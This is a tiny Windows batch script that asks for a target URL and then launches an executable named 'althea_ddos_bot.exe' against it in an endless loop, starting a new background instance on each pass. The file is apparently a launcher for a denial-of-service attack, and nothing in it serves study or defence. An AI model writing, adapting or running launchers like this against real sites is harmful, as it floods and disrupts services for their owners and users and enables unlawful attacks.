@echo off
cls
color 0b

set /p url=Please Enter URL: 

:loop
althea_ddos_bot.exe %url% &
goto loop